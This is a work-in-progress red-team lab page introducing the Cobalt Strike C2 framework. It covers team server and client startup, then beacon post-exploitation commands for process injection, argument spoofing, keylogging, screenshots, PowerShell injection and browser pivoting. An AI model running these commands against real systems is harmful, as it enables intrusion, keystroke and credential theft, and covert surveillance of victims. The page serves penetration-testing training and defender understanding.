# Cobalt Strike: 101

This lab is for exploring the advanced penetration testing / post-exploitation tool Cobalt Strike.

{% hint style="info" %}
WIP
{% endhint %}

## Definitions

* Listener - a service running on the attacker's C2 server that is listening for beacon callbacks
* Beacon - a malicious agent / implant on a compromised system that calls back to the attacker controlled system and checks for any new commands that should be executed on the compromised system
* Team server - Cobalt Strike's server component. Team server is where listeners for beacons are set up. Team server allows attackers instructing beacons to execute commands such as record keystrokes, dump passwords, etc on compromised systems.

## Getting Started

Cobalt Strike has client and server side components to it. First, we need to run the team server.

### Team Server

{% code-tabs %}
{% code-tabs-item title="attacker@kali" %}
```csharp
# the syntax is ./teamserver <serverIP> <password> <~killdate> <~profile>
# ~ optional for now
root@/opt/cobaltstrike# ./teamserver 10.0.0.5 password
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../.gitbook/assets/screenshot-from-2019-01-06-22-47-10.png)

{% hint style="info" %}
Note that in real life red team engagements, you would most likely use redirectors to add some resilience to your infrastructure. See [Red Team Infrastructure](red-team-infrastructure/)
{% endhint %}

### Cobalt Strike Client

{% code-tabs %}
{% code-tabs-item title="attacker@kali" %}
```csharp
root@/opt/cobaltstrike# ./cobaltstrike
```
{% endcode-tabs-item %}
{% endcode-tabs %}

Enter the following:

* host - team server IP or DNS name
* user - anything you like - it's just a nickname
* password - your team server password

![](../.gitbook/assets/screenshot-from-2019-01-06-22-51-40.png)

### Demo

![](../.gitbook/assets/peek-2019-01-06-22-56.gif)

## Setting Up Listener

![](../.gitbook/assets/peek-2019-01-07-18-01.gif)

## Generating a Stageless Payload

![](../.gitbook/assets/peek-2019-01-07-18-03.gif)

## Receiving First Call Back

![](../.gitbook/assets/peek-2019-01-07-18-15.gif)

## Interacting with Beacon

![](../.gitbook/assets/screenshot-from-2019-01-07-18-22-38.png)

## Interesting Commands

### Argue

{% code-tabs %}
{% code-tabs-item title="attacker@cs" %}
```csharp
beacon> argue calc /spoofed
beacon> run calc
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../.gitbook/assets/screenshot-from-2019-01-07-19-18-23.png)

![](../.gitbook/assets/screenshot-from-2019-01-07-19-09-47.png)

{% page-ref page="../offensive-security-experiments/masquerading-processes-in-userland-through-\_peb.md" %}

{% page-ref page="../memory-forensics/process-environment-block.md" %}

### Inject

{% code-tabs %}
{% code-tabs-item title="attacker@cs" %}
```csharp
beacon> help inject
Use: inject [pid] <x86|x64> [listener]

inject 776 x64 httplistener
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../.gitbook/assets/peek-2019-01-07-20-16.gif)

### Keylogger

{% code-tabs %}
{% code-tabs-item title="attacker@cs" %}
```csharp
beacon> keylogger 1736 x64
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../.gitbook/assets/screenshot-from-2019-01-07-20-31-30.png)

### Screenshot

{% code-tabs %}
{% code-tabs-item title="attacker@cs" %}
```csharp
beacon> screenshot 1736 x64
```
{% endcode-tabs-item %}
{% endcode-tabs %}



![](../.gitbook/assets/screenshot-from-2019-01-07-20-33-51.png)

### Runu

{% code-tabs %}
{% code-tabs-item title="attacker@cs" %}
```csharp
runu 2316 calc
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../.gitbook/assets/screenshot-from-2019-01-07-20-39-20.png)

### Psinject

{% code-tabs %}
{% code-tabs-item title="attacker@cs" %}
```csharp
beacon> psinject 2872 x64 get-childitem c:\
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../.gitbook/assets/screenshot-from-2019-01-07-20-44-30.png)

![](../.gitbook/assets/screenshot-from-2019-01-07-20-52-16.png)

### Spawnu

{% code-tabs %}
{% code-tabs-item title="attacker@cs" %}
```csharp
beacon> spawnu 3848 httplistener
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../.gitbook/assets/screenshot-from-2019-01-07-20-57-30.png)

![](../.gitbook/assets/screenshot-from-2019-01-07-20-57-25.png)

### Browser Pivoting

{% code-tabs %}
{% code-tabs-item title="attacker@cs" %}
```csharp
beacon> browserpivot 244 x86
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../.gitbook/assets/screenshot-from-2019-01-07-21-23-50.png)

![](../.gitbook/assets/screenshot-from-2019-01-07-21-33-54.png)

![](../.gitbook/assets/peek-2019-01-07-21-36.gif)



